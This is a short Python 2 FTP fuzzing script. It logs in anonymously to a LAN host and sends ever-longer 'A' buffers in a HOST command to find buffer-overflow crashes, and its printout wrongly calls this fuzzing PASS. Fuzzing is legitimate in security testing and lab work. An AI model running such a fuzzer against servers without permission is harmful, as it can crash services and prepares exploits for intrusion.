#!/usr/bin/python
import socket, os, sys


#creat an array of buffers, while incrementing them.

buffer=["A"]
counter=100
while len(buffer)<= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.0.156',21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send('HOST ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
